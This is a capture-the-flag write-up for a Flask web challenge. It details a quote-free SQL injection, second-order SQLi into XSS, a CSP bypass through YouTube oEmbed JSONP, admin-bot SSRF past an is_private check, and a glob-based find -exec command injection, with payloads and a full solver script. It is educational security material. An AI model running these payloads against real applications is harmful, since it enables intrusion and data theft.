# smol-web-player — CTF Writeup

## Challenge Overview

**smol-web-player** is a multi-stage web exploitation challenge featuring a retro-themed "Product Rating System" built with Flask + SQLite, a Puppeteer admin bot, and a localhost-only file search utility. The goal is to retrieve two flags:

| Flag | Location | Technique |
|------|----------|-----------|
| FLAG 1 | SQLite database (`products` table) | SQL Injection |
| FLAG 2 | `/root/flag.txt` (read via SUID binary) | SQLi → XSS → CSP Bypass → Bot SSRF → Command Injection |

---

## Reconnaissance

### Application Structure

```
smol-web-player/
├── app/
│   ├── main.py                  # Flask application
│   ├── templates/
│   │   ├── base.html            # Base template (green terminal theme)
│   │   ├── ratings_page.html    # Product listing (|safe on creator!)
│   │   ├── search_page.html     # Localhost-only file finder
│   │   └── report_page.html     # Bot report form
│   └── Dockerfile               # Deploys SUID /readflagbinary
├── bot/
│   ├── admin_bot.js             # Puppeteer bot visiting http://web:5000/{uri}
│   └── Dockerfile
└── docker-compose.yml
```

### Key Endpoints

| Route | Method | Access | Purpose |
|-------|--------|--------|---------|
| `/` | GET | Public | Product catalog (all products) |
| `/ratings?quantity=` | GET | Public | Filtered product view — **SQL injectable** |
| `/report` | POST | Public | Submit URL for admin bot to visit |
| `/finder` | GET | **Localhost only** | File search UI |
| `/search` | POST | **Localhost only** | Executes `find` command — **command injectable** |

### Access Control

The `/finder` and `/search` endpoints are protected by a `@localhost_only` decorator:

```python
def localhost_only(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not ip_address(request.remote_addr).is_private:
            abort(403)
        return f(*args, **kwargs)
    return wrapper
```

This checks `is_private` — not `is_loopback`. Any private IP (including Docker internal network addresses like `172.x.x.x`) passes this check. The admin bot runs in a separate Docker container on the same bridge network, so its requests to `http://web:5000` originate from a private IP.

### The SUID Binary

The Dockerfile reveals a critical setup:

```dockerfile
RUN echo "Hackena{t3st_fl4g_12345}" > /root/flag.txt && chmod 400 /root/flag.txt

RUN echo '...' > /tmp/readflag.c && \
    gcc -o /readflagbinary /tmp/readflag.c && \
    chmod 4755 /readflagbinary && \
    chown appuser:appuser /app
```

- Flag is at `/root/flag.txt`, readable only by root
- `/readflagbinary` is a SUID root binary that reads and prints the flag
- The app runs as `appuser` — must execute `/readflagbinary` to get FLAG 2

---

## FLAG 1: SQL Injection

### Vulnerability

The `/ratings` endpoint directly interpolates the `quantity` parameter into a SQL query:

```python
quantity = request.args.get("quantity", "") or '9'
if any(c in quantity for c in ("'", '"', "\\")):
    quantity = 7
    flash("Warning: Suspicious characters detected.")

sql = f"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}"
```

The filter only blocks three characters: `'`, `"`, and `\`. Since this is a numeric context, no quotes are needed for injection.

### Exploit

The FLAG product is stored with `quantity=7`:

```sql
INSERT INTO products ... ("FLAG", "Hackena{NUsxTExfMTU1VTM=}", 7, 1)
```

Simply visiting `/ratings?quantity=7` displays the flag. Alternatively, a UNION injection works:

```
/ratings?quantity=0 UNION SELECT id,name,description,user_id FROM products WHERE name=char(70,76,65,71)
```

Using `char(70,76,65,71)` spells "FLAG" without needing quotes.

### Flag 1

```
Hackena{NUsxTExfMTU1VTM=}
```

Base64-decoded inner value: `5K1LL_155U3`

---

## FLAG 2: Full Exploit Chain

This is a four-stage chain: **SQLi → XSS → Bot SSRF → Command Injection**

### Stage 1: Second-Order SQL Injection → XSS

#### The Vulnerability

In `ratings_page.html`, the creator field is rendered with the `|safe` filter, which disables Jinja2's auto-escaping:

```html
<td class="py-2">{{ product.creator|safe }}</td>
```

The `creator` value comes from a **second SQL query** that uses the `user_id` from the first query's results:

```python
# First query (injectable via quantity)
sql = f"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}"
rows = db.execute(sql).fetchall()

for r in rows:
    # Second query — user_id from first query is interpolated directly!
    user_q = f"SELECT id, name FROM users WHERE id = {r['user_id']}"
    user_row = db.execute(user_q).fetchone()
    user_name = user_row['name']  # ← This gets rendered with |safe
```

This creates a second-order SQLi chain: we control `user_id` via UNION in the first query, and that value is interpolated into the second query, whose output is rendered as raw HTML.

#### Building the Injection

We need to work in two layers:

**Layer 1 (quantity parameter):** UNION SELECT to control the `user_id` column:
```sql
0 UNION SELECT 1, char(65), char(66), char(<layer2_codes>)
--                  ↑name    ↑desc     ↑user_id (our 2nd-order payload)
```

**Layer 2 (user_id → user lookup):** When the app queries `SELECT id, name FROM users WHERE id = <our_value>`, our value contains another UNION:
```sql
0 UNION SELECT 1, char(<xss_html_codes>) --
--                 ↑ This becomes the user 'name' → rendered with |safe
```

We use `char()` throughout to avoid needing quotes (which are blocked by the first-level filter).

### Stage 2: CSP Bypass via YouTube oEmbed JSONP

#### The Problem

The application enforces a strict Content Security Policy:

```
script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com;
```

Inline scripts (`<script>alert(1)</script>`) are blocked. We can only load scripts from `self`, Tailwind CDN, or `youtube.com`.

#### The Bypass

YouTube's oEmbed API supports JSONP via a `callback` parameter:

```
https://www.youtube.com/oembed?url=http://youtube.com/watch?v=dQw4w9WgXcQ&callback=FUNCTION_NAME
```

This returns:
```javascript
FUNCTION_NAME({"title":"...","html":"...","provider_name":"YouTube",...})
```

By setting `callback=document.forms[0].submit`, the response becomes:
```javascript
document.forms[0].submit({"title":"...",...})
```

This calls `.submit()` on the first form in the DOM — our injected form! The JSON object passed as an argument is ignored by `submit()`.

#### The XSS Payload

```html
<form method="POST" action="/search">
  <input name="search" value="-exec /?e*y {} ;">
</form>
<script src="https://www.youtube.com/oembed?url=http://youtube.com/watch?v=dQw4w9WgXcQ&callback=document.forms[0].submit"></script>
```

When the bot renders this page:
1. The `<form>` is created with our command injection payload
2. The YouTube JSONP script loads (allowed by CSP)
3. The callback `document.forms[0].submit()` fires
4. The form POSTs to `/search` with our payload

### Stage 3: Bot SSRF to Localhost-Only Endpoint

The admin bot (Puppeteer) visits URLs relative to `http://web:5000/`:

```javascript
const origin = 'http://web:5000/';
await page.goto(origin + uri, { waitUntil: 'networkidle2' });
```

The bot's Docker container has a private network IP (e.g., `172.18.0.3`). When the XSS-injected form submits to `/search`, the request originates from this private IP, which passes the `is_private` check in `@localhost_only`.

We trigger the bot via the `/report` endpoint:

```python
requests.post(f"{TARGET}/report", data={"url": malicious_path})
```

### Stage 4: Command Injection via `find`

#### The Vulnerability

The `/search` endpoint builds a shell command using user input:

```python
cmd = f"find {FILES_DIR} {sanitized_payload}"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
```

#### The Sanitizer

```python
def sanitize_input(payload):
    s = str(payload)
    cmds = ['cc', 'gcc ', 'ex ', 'sleep ']
    
    # Character blocklist (regex)
    if re.search(r"""[<>mhnpdvq$srl+%kowatf123456789'^@"\\]""", s):
        return "Character Not Allowed"
    
    # Command blocklist
    if any(cmd in s for cmd in cmds):
        return "Command Not Allowed"
    
    # Escape shell metacharacters
    pattern = re.compile(r'([;&|$\(\)\[\]<>])')
    escaped = pattern.sub(r'\\\1', s)
    return escaped
```

**Blocked characters:**
```
< > m h n p d v q $ s r l + % k o w a t f 1-9 ' ^ @ " \
```

**Allowed characters (useful):**
```
b c e g i j u x y z 0 - _ . / ? * ~ { } = : ! ` (space) ; → \;
```

**Constraints:** Max 18 characters.

#### Crafting the Payload

We need to execute `/readflagbinary`. The `find` command supports `-exec`:

```
find ./uploads -exec /readflagbinary {} \;
```

But we can't type `/readflagbinary` directly — it contains blocked characters (`r`, `a`, `d`, `l`, `f`, `g`, `n`). We use shell glob patterns instead:

```
/?e*y
```

This matches `/readflagbinary`:
- `/` — literal slash
- `?` — matches `r` (any single char)
- `e` — literal `e`
- `*` — matches `adflagbinar` (any sequence)
- `y` — literal `y`

**Final payload:** `-exec /?e*y {} ;` (16 characters)

**Why this works with the sanitizer:**

| Character | Status |
|-----------|--------|
| `-` | Allowed |
| `e`, `x`, `c` | Allowed lowercase letters |
| `/` | Allowed |
| `?`, `*` | Allowed glob chars |
| `{`, `}` | Allowed |
| `;` | Escaped to `\;` by sanitizer |
| space | Allowed |

The sanitizer escapes `;` to `\;` — which is exactly what `find -exec` requires as its terminator. The sanitizer *helps* us here.

**Command blocklist check:** `'ex '` is in the blocklist, but our payload contains `exec` (no trailing space after `ex`), so it doesn't match.

The final executed command:
```bash
find ./uploads -exec /?e*y {} \;
```

This runs `/readflagbinary` for each file in `./uploads`, printing the flag to stdout.

---

## Complete Solver Script

```python
#!/usr/bin/env python3
import requests, sys, re, urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

# ── FLAG 1: Direct SQLi ─────────────────────────────────────
r = requests.get(f"{TARGET}/ratings", params={"quantity": "7"})
flag1 = re.search(r'(Hackena\{[^}]+\})', r.text)
print(f"FLAG 1: {flag1.group(1)}" if flag1 else "FLAG 1: not found")

# ── FLAG 2: Full chain ──────────────────────────────────────
CMD = "-exec /?e*y {} ;"

xss = (
    f'<form method="POST" action="/search">'
    f'<input name="search" value="{CMD}">'
    f'</form>'
    f'<script src="https://www.youtube.com/oembed'
    f'?url=http://youtube.com/watch?v=dQw4w9WgXcQ'
    f'&callback=document.forms[0].submit"></script>'
)

xss_codes = ",".join(str(ord(c)) for c in xss)
layer2 = f"0 UNION SELECT 1,char({xss_codes}) --"
layer2_codes = ",".join(str(ord(c)) for c in layer2)
sqli = f"0 UNION SELECT 1,char(65),char(66),char({layer2_codes})"

path = f"ratings?quantity={urllib.parse.quote(sqli)}"
r = requests.post(f"{TARGET}/report", data={"url": path}, timeout=20)
print(f"Bot: {r.status_code}")
```

---

## Flags

```
FLAG 1: Hackena{NUsxTExfMTU1VTM=}
FLAG 2: Hackena{l0ng_w4y_sm0l_fl4g_W3go_w3G00!!!}
```

---

## Key Takeaways

1. **`|safe` in Jinja2 is dangerous** — Never use it on user-controllable data, even if it comes from the database. The template assumed `creator` was trusted because it came from a separate `users` table, but the SQL injection allowed controlling the lookup path.

2. **Numeric SQLi doesn't need quotes** — The quote filter (`' " \`) was trivially bypassed because the injection point was in a numeric `WHERE` clause. `char()` in SQLite reconstructs any string without quotes.

3. **CSP JSONP bypasses are real** — Allowing `script-src https://www.youtube.com` opens the door to oEmbed JSONP callbacks. This is a well-known CSP bypass documented in [CSP Evaluator](https://csp-evaluator.withgoogle.com/).

4. **`is_private` ≠ `is_loopback`** — The access control checked `is_private` instead of `is_loopback`, allowing any Docker-internal IP to access "localhost-only" endpoints.

5. **Sanitizers can help attackers** — The semicolon escaping (`; → \;`) produced the exact syntax that `find -exec` requires. When building sanitizers, consider how escaped output interacts with downstream parsers.

6. **Shell glob patterns bypass character filters** — Even with most alphanumeric characters blocked, `/?e*y` was enough to resolve `/readflagbinary`. Glob expansion happens at the shell level, after the sanitizer runs.
